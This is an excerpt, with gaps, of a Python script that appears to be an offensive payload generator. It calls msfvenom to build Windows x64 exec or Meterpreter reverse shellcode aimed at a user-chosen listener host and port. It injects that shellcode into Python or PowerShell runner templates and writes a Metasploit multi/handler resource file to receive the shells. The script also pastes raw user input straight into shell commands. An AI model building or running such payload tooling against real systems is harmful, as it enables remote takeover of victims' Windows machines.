...
def shellcodelisteners():
    listen = input(Green+"do you want to start multi/handler:")
    if listen == "yes":
        with open("handlers/"+payloadname+".rc","w") as hand:
            hand.write("use multi/handler\n")
            hand.write("set payload windows/x64/meterpreter/reverse_"+prot+"\n")
...
2)Using Msf Payload Automaticly
    ...
    print(Green+"""
1) shellcode injection with python
2) shellcode injection with powershell
""")
    shellcode = int(input("choose:"))
    if shellcode == 1:
        print(Green+"""
        1) run a command on target system
        2) Generate Meterpreter payload 
        """)
        stager = int(input("choose:"))
        if stager == 1:
            command = input("enter the command you want to execute:")
            os.system("msfvenom -p windows/x64/exec CMD="+command+" -f py  -o shellcode >/dev/null 2>&1")
            print("[+] Generating shellcode")
            shell = open("shellcode").read()
            os.system("cp -r template/shellcode-runner.py payloads/")
            inplace_change("payloads/shellcode-runner.py","$shellcode",shell)
            name = input("enter payloadname:")
            os.system("mv payloads/shellcode-runner.py payloads/"+name+".py" )
            print("payload saved in payloads/"+name+".py")
            os.remove("shellcode")
        elif stager == 2:
            prot = input("meterpreter/reverse_(https,tcp..):")
            lhost = input("enter lhost:")
            lport = input("enter lport:")
            Exitfunc = input("Choose ExitFuncMethod(Default is Thread):")
            if Exitfunc == "":
                Exitfunc = "thread"
            os.system("msfvenom -p windows/x64/meterpreter/reverse_"+prot+ " lhost="+lhost+" lport="+lport+" EXITFUNC="+Exitfunc+" -f py  -o shellcode >/dev/null 2>&1")
            print("[+] Generating shellcode")
            shell = open("shellcode").read()
            os.system("cp -r template/shellcode-runner.py payloads/")
            inplace_change("payloads/shellcode-runner.py", "$shellcode", shell)
            payloadname = input("enter payloadname:")
            os.system("mv payloads/shellcode-runner.py payloads/" + payloadname + ".py")
            print("payload saved in payloads/" + payloadname + ".py")
            os.remove("shellcode")
            shellcodelisteners()
    elif shellcode == 2:
        print(Green + """
        ...
        if stager == 1:
            command = input("enter the command you want to execute:")
            os.system("msfvenom -p windows/x64/exec CMD=" + command + " -f powershell  -o shellcode >/dev/null 2>&1")
            print("[+] Generating shellcode")
            shell = open("shellcode").read()
            os.system("cp -r template/shellcode-exec.ps1 payloads/")
            inplace_change("payloads/shellcode-exec.ps1", "$shellcode", shell)
            name = input("enter payloadname:")
            os.system("mv payloads/shellcode-exec.ps1 payloads/" + name + ".ps1")
            print("payload saved in payloads/" + name + ".ps1")
            os.remove("shellcode")
        elif stager == 2:
            prot = input("meterpreter/reverse_(https,tcp..):")
            lhost = input("enter lhost:")
            ...
            if Exitfunc == "":
                Exitfunc = "thread"
            os.system(
                "msfvenom -p windows/x64/meterpreter/reverse_" + prot + " lhost=" + lhost + " lport=" + lport + " EXITFUNC=" + Exitfunc + " -f powershell  -o shellcode >/dev/null 2>&1")
            print("[+] Generating shellcode")
            shell = open("shellcode").read()
            os.system("cp -r template/shellcode-exec.ps1 payloads/")
            inplace_change("payloads/shellcode-exec.ps1", "$shellcode", shell)
            payloadname = input("enter payloadname:")
            os.system("mv payloads/shellcode-exec.ps1 payloads/" + payloadname + ".ps1")
            print("payload saved in payloads/" + payloadname + ".ps1")
            os.remove("shellcode")
            shellcodelisteners()
